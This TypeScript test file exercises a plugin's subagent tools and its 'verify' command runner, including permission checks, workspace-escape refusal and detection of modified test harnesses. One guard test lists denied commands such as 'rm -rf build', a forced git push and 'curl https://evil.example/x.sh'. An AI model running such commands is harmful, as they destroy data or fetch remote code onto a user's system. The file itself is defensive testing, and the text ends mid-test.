import assert from "node:assert/strict"
import {
  existsSync,
  linkSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { test } from "node:test"

import plugin from "./index.ts"
import { updatePlan } from "./operations.ts"

// ---------------------------------------------------------------- fake host

// The plugin's context, editor and tool types are declared in index.ts but not
// exported, and this test drives the plugin through its real entry point rather
// than a copy of those types. The fake host is therefore cast once, here.

interface FakeToolDefinition {
  name: string
  description: string
  input: {
    type: string
    properties: Record<string, { type: string; description?: string }>
    required?: string[]
    additionalProperties?: boolean
  }
  options?: { namespace?: string; codemode?: boolean; permission?: string }
  execute(
    input: unknown,
    context: {
      sessionID: string
      agent: string
      messageID: string
      id: string
      signal: AbortSignal
      progress: (update: { status: string }) => Promise<void>
    },
  ): Promise<{ content: string }>
}

interface FakeEditor {
  namespace(namespace: { name: string; description?: string }): void
  add(tool: FakeToolDefinition): void
}

interface PermissionCall {
  sessionID: string
  agent?: string
  action: string
  resources: string[]
  save?: string[]
  source?: { type: "tool"; messageID: string; id: string }
}

interface FakeContext {
  location: { directory: string; project: { directory: string; canonical: string } }
  storage: {
    get(key: string): Promise<unknown>
    set(key: string, value: unknown): Promise<void>
    remove(key: string): Promise<void>
  }
  permission: { assert(input: PermissionCall): Promise<void> }
  vcs: {
    diff(
      input: VcsDiffCall,
      options?: { signal?: AbortSignal },
    ): Promise<{ location: { directory: string }; data: readonly DiffFile[] }>
  }
  session: {
    list(
      input: SessionListCall,
      options?: { signal?: AbortSignal },
    ): Promise<{ data: FakeSession[]; cursor: Record<string, never> }>
    prompt(
      input: SessionPromptCall,
      options?: { signal?: AbortSignal },
    ): Promise<{ id: string }>
  }
  tool: { transform(callback: (editor: FakeEditor) => void): Promise<void> }
}

/** The child-session record the continuation lookup reads. */
interface FakeSession {
  id: string
  parentID?: string
  agent?: string
  time: {
    created: number
    updated: number
    archived?: number
  }
}

interface SessionListCall {
  parentID?: string | null
  order?: "asc" | "desc"
  archived?: boolean
}

interface SessionPromptCall {
  sessionID: string
  text: string
}

// The real `ctx.vcs.diff` input: the location comes from the plugin instance,
// so the caller passes the mode, an optional base and the context lines.
interface VcsDiffCall {
  mode: string
  base?: string
  context: number
}

interface DiffFile {
  file: string
  patch: string
  additions: number
  deletions: number
  status: "added" | "deleted" | "modified"
}

const setup = plugin.setup as unknown as (context: FakeContext) => Promise<void> | void

interface FakeHost {
  context: FakeContext
  tools: FakeToolDefinition[]
  namespace(): { name: string; description?: string } | undefined
  /** Every permission assertion the plugin made, in order. */
  permissionCalls: PermissionCall[]
  /** Set to reject the next assertion, the way a deny rule does. */
  denyPermission(reason: string): void
  /** Every `vcs.diff` call the plugin made, in order, with the signal it passed. */
  diffCalls: (VcsDiffCall & { signal?: AbortSignal })[]
  /** The files the fake VCS returns from a diff call. */
  setDiffFiles(files: readonly DiffFile[]): void
  /** Make diff calls reject, the way a failing git command does. */
  failDiff(message: string): void
  /** Every `session.list` call the plugin made, in order, with its signal. */
  sessionListCalls: (SessionListCall & { signal?: AbortSignal })[]
  /** Every `session.prompt` call the plugin made, in order, with its signal. */
  sessionPromptCalls: (SessionPromptCall & { signal?: AbortSignal })[]
  /** The child sessions the fake `session.list` returns. */
  setSessions(sessions: readonly FakeSession[]): void
}

function fakeHost(
  directory: string,
  project: { directory: string; canonical: string } = { directory, canonical: directory },
): FakeHost {
  const cache = new Map<string, unknown>()
  const tools: FakeToolDefinition[] = []
  const permissionCalls: PermissionCall[] = []
  const diffCalls: (VcsDiffCall & { signal?: AbortSignal })[] = []
  const sessionListCalls: (SessionListCall & { signal?: AbortSignal })[] = []
  const sessionPromptCalls: (SessionPromptCall & { signal?: AbortSignal })[] = []
  let namespace: { name: string; description?: string } | undefined
  let denial: string | undefined
  let diffFiles: readonly DiffFile[] = []
  let diffError: Error | undefined
  let sessions: readonly FakeSession[] = []

  const context: FakeContext = {
    location: { directory, project },
    storage: {
      async get(key) {
        return cache.get(key)
      },
      async set(key, value) {
        cache.set(key, value)
      },
      async remove(key) {
        cache.delete(key)
      },
    },
    permission: {
      async assert(input) {
        permissionCalls.push(input)
        if (denial !== undefined) {
          const error = new Error(denial)
          error.name = "ToolError"
          throw error
        }
      },
    },
    vcs: {
      async diff(input, options) {
        diffCalls.push({ ...input, signal: options?.signal })
        if (diffError !== undefined) throw diffError
        return { location: { directory }, data: diffFiles }
      },
    },
    session: {
      async list(input, options) {
        sessionListCalls.push({ ...input, signal: options?.signal })
        // The fake returns the configured records unfiltered, so the tool's
        // own parent/agent/archive filtering is exercised rather than trusted
        // to the service.
        return { data: [...sessions], cursor: {} }
      },
      async prompt(input, options) {
        sessionPromptCalls.push({ ...input, signal: options?.signal })
        return { id: "inbox_test" }
      },
    },
    tool: {
      async transform(callback) {
        callback({
          namespace(value) {
            namespace = value
          },
          add(tool) {
            tools.push(tool)
          },
        })
      },
    },
  }

  return {
    context,
    tools,
    namespace: () => namespace,
    permissionCalls,
    denyPermission(reason) {
      denial = reason
    },
    diffCalls,
    setDiffFiles(files) {
      diffFiles = files
    },
    failDiff(message) {
      diffError = new Error(message)
    },
    sessionListCalls,
    sessionPromptCalls,
    setSessions(next) {
      sessions = next
    },
  }
}

/** One fake working-diff entry, with the defaults a test usually needs. */
function diffFile(file: string, status: DiffFile["status"] = "modified"): DiffFile {
  return { file, patch: "", additions: 1, deletions: 0, status }
}

/** One fake child session, parented to the running tool's test session. */
function childSession(
  id: string,
  updated: number,
  agent = "core-developer",
  options: { parentID?: string; created?: number; archived?: number } = {},
): FakeSession {
  return {
    id,
    parentID: options.parentID ?? "ses_test",
    agent,
    time: {
      created: options.created ?? updated,
      updated,
      ...(options.archived === undefined ? {} : { archived: options.archived }),
    },
  }
}

async function runTool(
  host: FakeHost,
  name: string,
  input: unknown,
  signal: AbortSignal = new AbortController().signal,
): Promise<string> {
  const tool = host.tools.find((entry) => entry.name === name)
  assert.ok(tool, `${name} is registered`)
  const result = await tool.execute(input, {
    sessionID: "ses_test",
    agent: "wippaAGENT",
    messageID: "msg_test",
    id: "call_test",
    signal,
    progress: async () => {},
  })
  return result.content
}

// ---------------------------------------------------------------- fixture

function probeAgent(description: string): string {
  return `---\ndescription: ${description}\nmode: subagent\n---\n\nProbe body.\n`
}

function probeRoster(category: string): string {
  return [
    "## Your roster",
    "",
    "Three probe agents.",
    "",
    "| Agent | Category |",
    "| --- | --- |",
    `| \`probe-alpha\` | ${category} |`,
    `| \`probe-beta\` | ${category} |`,
    `| \`probe-gamma\` | ${category} |`,
    "",
  ].join("\n")
}

/** A project scope with three flat agents and a roster, as install.sh writes it. */
function probeFixture(rosterBeside = false): { root: string; agents: string; roster: string } {
  const root = mkdtempSync(join(tmpdir(), "wippa-plugin-"))
  const agents = join(root, "agents")
  mkdirSync(agents, { recursive: true })
  writeFileSync(join(agents, "probe-alpha.md"), probeAgent("Alpha probe agent."))
  writeFileSync(join(agents, "probe-beta.md"), probeAgent("Beta probe agent."))
  writeFileSync(join(agents, "probe-gamma.md"), probeAgent("Gamma probe agent."))

  const roster = rosterBeside ? join(root, "wippaAGENT.md") : join(agents, "wippaAGENT.md")
  writeFileSync(roster, probeRoster("Probe Group"))
  return { root, agents, roster }
}

// ---------------------------------------------------------------- tests

test("setup registers the eight wippa tools in the wippa namespace", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  assert.equal(plugin.id, "wippa-subagent-tools")
  assert.deepEqual(
    host.tools.map((tool) => tool.name),
    [
      "subagent_search",
      "subagent_get",
      "subagent_list",
      "subagent_invalid",
      "subagent_continue",
      "verify",
      "diff",
      "plan_update",
    ],
  )
  for (const tool of host.tools) {
    const permission =
      tool.name === "verify"
        ? "verify"
        : tool.name === "plan_update"
          ? "plan_update"
          : tool.name === "subagent_continue"
            ? "subagent_continue"
            : undefined
    const expected =
      permission === undefined
        ? { namespace: "wippa", codemode: false }
        : { namespace: "wippa", codemode: false, permission }
    assert.deepEqual(tool.options, expected)
    assert.equal(tool.input.type, "object")
    assert.ok(tool.description.length > 0, `${tool.name} carries a description`)
  }
  assert.deepEqual(host.tools.find((tool) => tool.name === "subagent_search")?.input.required, [
    "query",
  ])
  assert.deepEqual(host.tools.find((tool) => tool.name === "verify")?.input.required, ["command"])
  assert.deepEqual(host.tools.find((tool) => tool.name === "subagent_continue")?.input.required, [
    "agent",
    "prompt",
  ])
  const continueTool = host.tools.find((tool) => tool.name === "subagent_continue")
  assert.deepEqual(Object.keys(continueTool?.input.properties ?? {}).sort(), ["agent", "prompt"])
  assert.equal(continueTool?.input.additionalProperties, false, "no session id or path is accepted")

  assert.equal(host.namespace()?.name, "wippa")
  assert.equal(
    host.namespace()?.description,
    "Find, inspect and refresh the wippaAGENT subagent catalog, continue the latest session of a named subagent, run acceptance commands with a real exit code, and read diffs as structured files.",
  )
})

test("subagent_search returns a match for a fixture agent", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const content = await runTool(host, "subagent_search", { query: "probe-alpha" })
  assert.match(content, /`probe-alpha`/)
  assert.match(content, /Alpha probe agent\./)
})

test("subagent_list groups the fixture agents by their roster category", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const content = await runTool(host, "subagent_list", {})
  assert.match(content, /## Probe Group \(3\)/)
  assert.match(content, /`probe-beta`/)
})

test("subagent_search treats limit 0 as uncapped and limit 2 as a cap", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  // The bundle ships its own agents beside the fixture ones, so only the
  // fixture rows are pinned; the cap itself is what the assertion checks.
  const capped = await runTool(host, "subagent_search", { query: "probe", limit: 2 })
  assert.match(capped, /Showing 2 of \d+/)
  assert.ok(!capped.includes("`probe-gamma`"), "the cap hides the third match")

  const uncapped = await runTool(host, "subagent_search", { query: "probe", limit: 0 })
  for (const id of ["probe-alpha", "probe-beta", "probe-gamma"]) {
    assert.ok(uncapped.includes(`\`${id}\``), `${id} is shown for limit 0`)
  }
  assert.ok(!uncapped.includes("Showing"), "limit 0 adds no truncation note")
})

test("subagent_list treats limit 0 as uncapped and limit 2 as a cap", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const capped = await runTool(host, "subagent_list", { limit: 2 })
  assert.match(capped, /1 more in this category/)
  assert.ok(!capped.includes("`probe-gamma`"), "the cap hides the third agent")

  const uncapped = await runTool(host, "subagent_list", { limit: 0 })
  assert.match(uncapped, /`probe-gamma`/)
  assert.ok(!uncapped.includes("more in this category"), "limit 0 adds no more-line")
})

test("subagent_search accepts the 1000 boundary and a limit above the maximum", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  // Above the maximum the limit clamps to 1000, which is larger than every
  // fixture match, so both values must take the same path as an uncapped
  // search: 1001 is accepted rather than rejected as a bad input.
  for (const limit of [1_000, 1_001]) {
    const content = await runTool(host, "subagent_search", { query: "probe", limit })
    assert.match(content, /agents? match "probe"\./)
    for (const id of ["probe-alpha", "probe-beta", "probe-gamma"]) {
      assert.ok(content.includes(`\`${id}\``), `${id} is shown for limit ${limit}`)
    }
    assert.ok(!content.includes("Showing"), `limit ${limit} truncates nothing`)
  }
})

test("subagent_list accepts a limit above the maximum without truncating a small category", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const content = await runTool(host, "subagent_list", { limit: 1_001 })
  assert.match(content, /## Probe Group \(3\)/)
  for (const id of ["probe-alpha", "probe-beta", "probe-gamma"]) {
    assert.ok(content.includes(`\`${id}\``), `${id} is shown`)
  }
  assert.ok(
    !content.includes("more in this category"),
    "the clamped limit is above every category",
  )
})

test("a non-string query, id or category is treated as absent, not coerced", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  // A number in a string position must reach the friendly message path rather
  // than throw or match the literal text.
  assert.match(await runTool(host, "subagent_search", { query: 123 }), /A query is required\./)

  const get = await runTool(host, "subagent_get", { id: 42 })
  assert.match(
    get,
    /No agent with the id "" is installed\./,
    "the number is absent, not stringified to \"42\"",
  )
  assert.match(get, /wippa_subagent_search/)

  const list = await runTool(host, "subagent_list", { category: 7 })
  assert.match(list, /## Probe Group \(3\)/)
  assert.match(list, /`probe-alpha`/)
})

test("subagent_continue resumes the newest child session of the named agent", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  host.setSessions([
    childSession("ses_old", 100),
    childSession("ses_middle", 200),
    childSession("ses_newest", 300),
  ])
  await setup(host.context)

  const controller = new AbortController()
  const prompt = "Continue the guard work.\nKeep the diff small."
  const content = await runTool(
    host,
    "subagent_continue",
    { agent: "core-developer", prompt },
    controller.signal,
  )

  assert.deepEqual(JSON.parse(content), {
    ok: true,
    agent: "core-developer",
    sessionID: "ses_newest",
  })
  assert.deepEqual(host.sessionListCalls, [
    {
      parentID: "ses_test",
      order: "desc",
      archived: false,
      signal: controller.signal,
    },
  ])
  assert.deepEqual(
    host.sessionPromptCalls,
    [{ sessionID: "ses_newest", text: prompt, signal: controller.signal }],
    "the prompt text is forwarded unchanged to the newest child",
  )
  assert.equal(host.permissionCalls.length, 1)
  assert.equal(host.permissionCalls[0]?.action, "subagent_continue")
  assert.deepEqual(host.permissionCalls[0]?.resources, ["core-developer"])
  assert.deepEqual(host.permissionCalls[0]?.save, ["core-developer"])
})

test("subagent_continue ignores another agent's child and errors without prompting", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  host.setSessions([
    childSession("ses_debugger", 900, "debugger"),
    childSession("ses_elsewhere", 1_000, "core-developer", { parentID: "ses_other" }),
    childSession("ses_archived", 1_100, "core-developer", { archived: 1 }),
  ])
  await setup(host.context)

  const content = await runTool(host, "subagent_continue", {
    agent: "core-developer",
    prompt: "Continue.",
  })
  const result = JSON.parse(content)

  assert.match(result.error, /no child session was found/)
  assert.match(result.error, /core-developer/)
  assert.equal(host.sessionPromptCalls.length, 0, "no unrelated or archived session was prompted")
  assert.equal(host.permissionCalls.length, 1, "the assertion still ran before the lookup")
  assert.equal(host.sessionListCalls.length, 1)
})

test("a denied subagent_continue permission prevents both list and prompt", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  host.setSessions([childSession("ses_newest", 300)])
  host.denyPermission("denied by rule")
  await setup(host.context)

  await assert.rejects(
    () =>
      runTool(host, "subagent_continue", {
        agent: "core-developer",
        prompt: "Continue.",
      }),
    /denied by rule/,
  )
  assert.equal(host.permissionCalls.length, 1)
  assert.equal(host.sessionListCalls.length, 0)
  assert.equal(host.sessionPromptCalls.length, 0)
})

test("subagent_continue refuses an empty agent or prompt before any permission call", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  for (const input of [
    { agent: "", prompt: "Continue." },
    { agent: "core-developer", prompt: "" },
    { agent: "   ", prompt: "Continue." },
    { agent: "core-developer", prompt: "   " },
    { agent: 42, prompt: "Continue." },
    { agent: "core-developer", prompt: 42 },
  ]) {
    const result = JSON.parse(await runTool(host, "subagent_continue", input))
    assert.match(result.error, /must be a non-empty string/)
  }
  assert.equal(host.permissionCalls.length, 0)
  assert.equal(host.sessionListCalls.length, 0)
  assert.equal(host.sessionPromptCalls.length, 0)
})

test("verify runs an acceptance command and returns the verdict as JSON", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const content = await runTool(host, "verify", { command: "echo wippa-plugin-verify" })
  const result = JSON.parse(content)

  assert.equal(result.ok, true)
  assert.equal(result.exitCode, 0)
  assert.ok(result.stdout.includes("wippa-plugin-verify"))
  assert.equal(result.cwd, root, "the location directory is the default working directory")
})

test("verify rejects a bad command without spawning anything", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  for (const bad of ["", "   ", "x".repeat(10_001), 42, undefined]) {
    const result = JSON.parse(await runTool(host, "verify", { command: bad }))
    assert.equal(result.ok, false, `${String(bad).slice(0, 20)} is rejected`)
    assert.equal(result.exitCode, -1)
    assert.equal(result.reason, "invalid-command")
    assert.equal(result.command, "")
    assert.match(result.stderr, /command must be a non-empty string of at most 10000 characters/)
    assert.equal(result.cwd, root)
  }
})

test("verify refuses a cwd that escapes the location or is not a sane path", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  for (const bad of ["../escape", "a/../../b", "line\nbreak", "nul\0byte"]) {
    const result = JSON.parse(await runTool(host, "verify", { command: "echo hi", cwd: bad }))
    assert.equal(result.ok, false, `${JSON.stringify(bad)} is refused`)
    assert.equal(result.exitCode, -1)
    assert.equal(result.reason, "invalid-cwd")
    assert.match(result.stderr, /working directory was refused/)
    assert.equal(result.cwd, root)
  }

  // The refusal happens before the guard and before the permission call.
  assert.equal(host.permissionCalls.length, 0)
})

test("verify runs with a valid custom cwd resolved against the location", async () => {
  // Quality E: the negative cwd test existed; this is the positive
  // counterpart — a sane relative cwd passes validation, resolves against
  // the location directory, and the command actually runs there.
  const { root } = probeFixture()
  mkdirSync(join(root, "sub"), { recursive: true })
  const host = fakeHost(root)
  await setup(host.context)

  const content = await runTool(host, "verify", { command: "pwd", cwd: "sub" })
  const result = JSON.parse(content)

  assert.equal(result.ok, true)
  assert.equal(result.exitCode, 0)
  assert.equal(result.cwd, join(root, "sub"), "the relative cwd resolves against the location directory")
  assert.ok(result.stdout.trim().endsWith("sub"), `pwd ran in sub, got ${JSON.stringify(result.stdout)}`)
  // A valid cwd passes validation and reaches the permission assertion.
  assert.equal(host.permissionCalls.length, 1)
})

test("verify refuses a cwd outside the workspace, including one reached through a symlink", async () => {
  const { root } = probeFixture()
  const outside = mkdtempSync(join(tmpdir(), "wippa-outside-"))
  symlinkSync(outside, join(root, "escape-link"))
  const host = fakeHost(root)
  await setup(host.context)

  for (const cwd of [outside, "escape-link"]) {
    const result = JSON.parse(await runTool(host, "verify", { command: "pwd", cwd }))
    assert.equal(result.ok, false, cwd)
    assert.equal(result.exitCode, -1)
    assert.equal(result.reason, "invalid-cwd")
    assert.equal(result.stdout, "", "the command was refused before it spawned")
    assert.match(result.stderr, /outside the workspace/)
  }

  // A sibling directory whose name extends the workspace path must not pass
  // the separator check by string prefix alone.
  const sibling = `${root}-sibling`
  mkdirSync(sibling, { recursive: true })
  const siblingResult = JSON.parse(
    await runTool(host, "verify", { command: "pwd", cwd: sibling }),
  )
  assert.equal(siblingResult.ok, false)
  assert.equal(siblingResult.reason, "invalid-cwd")

  // The refusal is before the harness check: no working diff was read.
  assert.equal(host.diffCalls.length, 0)
})

test("verify passes timeoutMs through to the command", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const tool = host.tools.find((entry) => entry.name === "verify")
  assert.ok(tool?.input.properties.timeoutMs, "the tool input exposes timeoutMs")

  const started = Date.now()
  const result = JSON.parse(await runTool(host, "verify", { command: "sleep 5", timeoutMs: 500 }))
  const elapsed = Date.now() - started

  assert.equal(result.ok, false)
  assert.equal(result.reason, "timeout")
  assert.equal(result.exitCode, -1)
  // 500 is raised to the 1000ms floor inside verify: far below the 5s the
  // command would take, and below the 300s default.
  assert.ok(elapsed >= 500 && elapsed < 3_000, `killed at ~1s rather than waited out (${elapsed}ms)`)
})

test("verify forwards the call's abort signal to the running command", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const controller = new AbortController()
  setTimeout(() => controller.abort(), 50)
  const result = JSON.parse(
    await runTool(host, "verify", { command: "sleep 5" }, controller.signal),
  )

  assert.equal(result.ok, false)
  assert.equal(result.reason, "aborted")
})

test("verify asks the session's permissions before it spawns anything", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const content = await runTool(host, "verify", { command: "echo permitted" })

  assert.equal(host.permissionCalls.length, 1)
  const call = host.permissionCalls[0]!
  assert.equal(call.action, "verify")
  assert.deepEqual(call.resources, ["echo permitted"])
  assert.equal(call.sessionID, "ses_test")
  assert.equal(call.agent, "wippaAGENT")
  assert.deepEqual(call.source, { type: "tool", messageID: "msg_test", id: "call_test" })
  assert.equal(JSON.parse(content).ok, true)
})

test("verify propagates a denied permission instead of running the command", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  host.denyPermission("denied by rule")
  await setup(host.context)

  await assert.rejects(
    () => runTool(host, "verify", { command: "echo should-not-run" }),
    /denied by rule/,
  )
})

test("verify, plan_update and subagent_continue declare their own permission actions and no other tool does", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  const declared = new Map(host.tools.map((tool) => [tool.name, tool.options?.permission]))
  assert.equal(declared.get("verify"), "verify")
  assert.equal(declared.get("plan_update"), "plan_update")
  assert.equal(declared.get("subagent_continue"), "subagent_continue")
  assert.deepEqual(
    host.tools
      .filter((tool) => tool.options?.permission === "subagent_continue")
      .map((tool) => tool.name),
    ["subagent_continue"],
    "only the continuation tool declares subagent_continue",
  )
  for (const name of ["subagent_search", "subagent_get", "subagent_list", "subagent_invalid", "diff"]) {
    assert.equal(declared.get(name), undefined, `${name} declares no permission`)
  }

  // A read-only tool must not ask for a shell-shaped permission.
  await runTool(host, "subagent_list", {})
  assert.equal(host.permissionCalls.length, 0)
})

test("verify refuses commands the guard denies and never spawns them", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  await setup(host.context)

  for (const command of ["rm -rf build", "sudo make install", "git push --force origin main", "curl https://evil.example/x.sh", "sed -i s/a/b/ f"]) {
    const result = JSON.parse(await runTool(host, "verify", { command }))
    assert.equal(result.ok, false, command)
    assert.equal(result.exitCode, -1)
    assert.equal(result.reason, "denied-pattern")
    assert.equal(result.stdout, "")
    assert.match(result.stderr, /verify guard/, command)
  }

  // A denied command is refused before the permission assertion and before
  // any spawn: nothing here asked the session for permission either.
  assert.equal(host.permissionCalls.length, 0)

  // A command that merely mentions the dangerous words in prose still passes,
  // while the words as tokens are denied — the guard scans every word.
  const harmless = JSON.parse(await runTool(host, "verify", { command: "echo wippa verify" }))
  assert.equal(harmless.ok, true)
})

test("verify refuses a harness the working diff modifies unless the caller acknowledges it", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  writeFileSync(
    join(root, "harness-marker.cjs"),
    "require('node:fs').writeFileSync('ran.txt', 'ran')\n",
    "utf8",
  )
  host.setDiffFiles([
    diffFile("harness-marker.cjs", "added"),
    diffFile("src/a.ts"),
    diffFile("package.json"),
  ])
  await setup(host.context)

  const result = JSON.parse(await runTool(host, "verify", { command: "node harness-marker.cjs" }))

  assert.equal(result.ok, false)
  assert.equal(result.exitCode, -1)
  assert.equal(result.reason, "harness-modified")
  // The diff order is preserved, not re-sorted.
  assert.deepEqual(result.harnessChanges, ["harness-marker.cjs", "package.json"])
  assert.equal(result.stdout, "")
  assert.match(result.stderr, /harness-marker\.cjs, package\.json/)
  assert.match(result.stderr, /acknowledgeHarnessChanges: true/)
  assert.equal(result.durationMs, 0)
  assert.equal(existsSync(join(root, "ran.txt")), false, "the refused command was not spawned")
  // The permission assertion runs first; the harness check then reads the
  // diff once and refuses without spawning.
  assert.equal(host.permissionCalls.length, 1)
  assert.equal(host.diffCalls.length, 1)
})

test("verify runs a modified harness when the caller acknowledges it and reports the files", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  writeFileSync(
    join(root, "harness-marker.cjs"),
    "require('node:fs').writeFileSync('ran.txt', 'ran')\n",
    "utf8",
  )
  host.setDiffFiles([
    diffFile("harness-marker.cjs", "added"),
    diffFile("src/a.ts"),
    diffFile("package.json"),
  ])
  await setup(host.context)

  const result = JSON.parse(
    await runTool(host, "verify", {
      command: "node harness-marker.cjs",
      acknowledgeHarnessChanges: true,
    }),
  )

  assert.equal(result.ok, true)
  assert.equal(result.exitCode, 0)
  assert.deepEqual(result.harnessChanges, ["harness-marker.cjs", "package.json"])
  assert.equal(readFileSync(join(root, "ran.txt"), "utf8"), "ran")
})

test("verify runs normally when the working diff changes no harness", async () => {
  const { root } = probeFixture()
  const host = fakeHost(root)
  host.setDiffFiles([diffFile("src/a.ts"), diffFile("README.md")])
  await setup(host.context)

  const result = JSON.parse(await runTool(host, "verify", { command: "echo wippa-harness" }))

  assert.equal(result.ok, true)
  assert.equal(result.harnessChanges, undefined)
  assert.equal(result.harnessCheck, undefined)
  assert.equal(host.diffCalls.length, 1)
})

test("verify follows an npm script to the harness it runs", async () => {
  const { root } = probeFixture()
  // `npm test` runs `make check`; the changed Makefile is reached only
  // through package.json, so the direct classification cannot see it.
  writeFileSync(
    join(root, "package.json"),
    JSON.stringify({ scripts: { test: "make check" } }),
    "utf8",
  )
  const host = fakeHost(root)
  host.setDiffFiles([diffFile("Makefile"), diffFile("src/a.ts")])
  await setup(host.context)

  const result = JSON.parse(await runTool(host, "verify", { command: "npm test" }))

  assert.equal(result.ok, false)
  assert.equal(result.exitCode, -1)
  assert.equal(result.reason, "harness-modified")
  assert.deepEqual(result.harnessChanges, ["Makefile"])
  assert.match(result.stderr, /Makefile/)
  assert.equal(result.stdout, "")
  assert.equal(host.diffCalls.length, 1)
})

test("verify reads the npm manifest from the working directory, not the workspace root", async () => {
  const { root } = probeFixture()
  mkdirSync(join(root, "sub"), { recursive: true })
  // npm runs in `sub`, so `sub/package.json` is the manifest npm reads. The
  // root entry is benign on purpose: reading it instead would miss the
  // Makefile and spawn the real `npm test`, which runs `make check` in `sub`.
  writeFileSync(join(root, "package.json"), JSON.stringify({ scripts: { test: "true" } }), "utf8")
  writeFileSync(join(root, "sub", "package.json"), JSON.stringify({ scripts: { test: "make check" } }), "utf8")
  writeFileSync(join(root, "sub", "Makefile"), "check:\n\t@touch sub-ran\n", "utf8")
  const host = fakeHost(root)
  host.setDiffFiles([diffFile("sub/Makefile"), diffFile("src/a.ts")])
  await setup(host.context)

  const result = JSON.parse(await runTool(host, "verify", { command: "npm test", cwd: "sub" }))

  assert.equal(result.ok, false)
  assert.equal(result.exitCode, -1)
  assert.equal(result.reason, "harness-modified")
  assert.deepEqual(result.harnessChanges, ["sub/Makefile"])
  assert.match(result.stderr, /sub\/Makefile/)
  assert.equal(result.stdout, "")
  assert.equal(existsSync(join(root, "sub", "sub-ran")), false, "the refused script was not spawned")
})

test("verify follows chained, prefixed, option-shaped and quoted npm script bodies", async () => {
  const cases: readonly {
    readonly label: string
    readonly scripts: Record<string, string>
    readonly command: string
  }[] = [
    {
      label: "a chained script body",
      scripts: { test: "npm run a && npm run b", a: "true", b: "make check" },
      command: "npm test",
    },
    {
      label: "an environment prefix",
      scripts: { test: "NODE_ENV=test npm run b", b: "make check" },
      command: "npm test",
    },
    {
      label: "a long option before the script name",
      scripts: { build: "make check" },
      command: "npm run --silent build",
    },
    {
      label: "a short option before the script name",
      scripts: { build: "make check" },
      command: "npm run -s build",
    },
    {
      label: "a value-taking option before the script name",
      scripts: { build: "make check" },
      command: "npm run --workspace pkg build",
    },
    {
      label: "a quoted script name with a space",
      scripts: { "build step": "make check" },
      command: 'npm run "build step"',
    },
  ]

  for (const { label, scripts, command } of cases) {
    const { root } = probeFixture()
    writeFileSync(join(root, "package.json"), JSON.stringify({ scripts }), "utf8")
    const host = fakeHost(root)
    host.setDiffFiles([diffFile("Makefile")])
    await setup(host.context)

    const result = JSON.parse(await runTool(host, "verify", { command }))

    assert.equal(result.ok, false, label)
    assert.equal(result.exitCode, -1, label)
    assert.equal(result.reason, "harness-modified", label)
    assert.deepEqual(result.harnessChanges, ["Makefile"], label)
    assert.equal(result.stdout, "", label)
    assert.match(result.stderr, /Makefile/, label)
  }
})

test("verify walks up to the npm manifest above the working directory", async () => {
  const { root } = probeFixture()
  mkdirSync(join(root, "sub"), { recursive: true })
  // `sub` has no manifest of its own, so npm resolves the root one. The root
  // script runs `make check`, which only the indirect lookup can see.
  writeFileSync(
    join(root, "package.json"),
    JSON.stringify({ scripts: { test: "make check" } }),
    "utf8",
  )
  writeFileSync(join(root, "Makefile"), "check:\n\t@touch ran\n", "utf8")
  const host = fakeHost(root)
  host.setDiffFiles([diffFile("Makefile"), diffFile("src/a.ts")])
  await setup(host.context)

  const result = JSON.parse(await runTool(host, "verify", { command: "npm test", cwd: "sub" }))

  assert.equal(result.ok, false)
  assert.equal(result.exitCode, -1)
  assert.equal(result.reason, "harness-modified")
  assert.deepEqual(result.harnessChanges, ["Makefile"])
  assert.equal(result.stdout, "")
  assert.equal(result.durationMs, 0)
  assert.match(result.stderr, /Makefile/)
  assert.equal(existsSync(join(root, "ran")), false, "the refused script was not spawned")
})

test("verify follows an npm workspace selection to the workspace script", async () => {
  const { root } = probeFixture()
  mkdirSync(join(root, "pkg"), { recursive: true })
  // The root scripts are benign; only the selected workspace's script names
  // `make check`, so a lookup that stays on the root manifest would miss it.
  writeFileSync(
    join(root, "package.json"),
    JSON.stringify({
      private: true,
      workspaces: ["pkg"],
      scripts: { test: "true", build: "true" },
    }),
    "utf8",
  )
  writeFileSync(
    join(root, "pkg", "package.json"),
    JSON.stringify({ name: "pkg", scripts: { test: "make check", build: "make check" } }),
    "utf8",
  )
  writeFileSync(join(root, "pkg", "Makefile"), "check:\n\t@touch ran\n", "utf8")
  const host = fakeHost(root)
  host.setDiffFiles([diffFile("pkg/Makefile")])
  await setup(host.context)

  for (const command of [
    "npm run --workspace pkg build",
    "npm test --workspace pkg",
    "npm test --workspace=pkg",
    "npm test --workspaces",
    "npm test --workspaces=true",
    "npm test -w pkg",
    "npm test -w=pkg",
  ]) {
    const result = JSON.parse(await runTool(host, "verify", { command }))

    assert.equal(result.ok, false, command)
    assert.equal(result.exitCode, -1, command)
    assert.equal(result.reason, "harness-modified", command)
    assert.deepEqual(result.harnessChanges, ["pkg/Makefile"], command)
